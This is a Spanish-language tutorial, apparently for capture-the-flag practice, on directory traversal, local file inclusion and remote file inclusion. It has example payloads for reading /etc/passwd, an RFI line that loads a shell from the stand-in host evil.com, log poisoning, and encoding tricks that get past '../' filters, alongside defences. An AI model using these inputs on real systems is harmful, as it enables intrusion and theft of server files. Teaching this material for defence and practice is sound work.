# LFI, RFI y Directory Traversal

Estas tres vulnerabilidades están muy relacionadas: todas explotan que una aplicación **incluye o lee archivos usando una ruta que el usuario puede manipular.**

## Directory Traversal (recorrido de directorios)
Consiste en acceder a archivos/directorios fuera del alcance permitido, manipulando la ruta con secuencias como `../` (subir un directorio).

**Ejemplo:**
```
?file=../../../../etc/passwd
```

**Objetivo del atacante:**
- Ver archivos sensibles del servidor.
- Leer el código fuente de scripts (a veces revela credenciales o lógica interna).
- Acceder a archivos de configuración con contraseñas.

## LFI (Local File Inclusion)
Es un paso más allá del directory traversal: la aplicación no solo **lee** el archivo, sino que lo **incluye y ejecuta** como parte de su propio código (típico en aplicaciones PHP mal configuradas).

**Ejemplo:**
```
?page=../../../../etc/passwd
```

Si además se puede lograr que el archivo incluido contenga código PHP controlado por el atacante (por ejemplo, "envenenando" un log del servidor con código malicioso y luego incluyendo ese log), un LFI puede escalar hasta ejecución remota de código.

## RFI (Remote File Inclusion)
Es como el LFI, pero en vez de incluir un archivo local, la aplicación incluye un archivo **remoto**, alojado en un servidor del atacante — solo funciona si la configuración del servidor lo permite (`allow_url_include` activado en PHP, algo cada vez menos común).

**Ejemplo:**
```
?page=http://evil.com/shell.txt
```
Si `shell.txt` contiene código malicioso, el servidor vulnerable lo ejecuta como si fuera propio — esto es directamente ejecución remota de código.

## Impacto combinado (LFI/RFI)
- Robo de información sensible.
- Ejecución remota de código si el archivo incluido tiene código malicioso.
- Escalada de privilegios.

## Protección (para entender qué se está evadiendo)
- Validación estricta de rutas permitidas.
- Deshabilitar `allow_url_include` en la configuración del servidor.
- Usar listas blancas de archivos válidos en vez de aceptar cualquier ruta.
- Sanitizar entradas, prohibiendo secuencias como `../`.

## Cómo identificar estos retos
- Un parámetro de URL que claramente apunta a un archivo o página (`?page=`, `?file=`, `?include=`, `?template=`).
- Probar con rutas clásicas como `/etc/passwd` (Linux) o `C:\Windows\win.ini` (Windows) para confirmar si el parámetro es explotable.
- Si el filtro bloquea `../`, prueben variantes de codificación (`..%2f`, doble codificación `%252e%252e%252f`) — es un truco de evasión de filtros muy común.
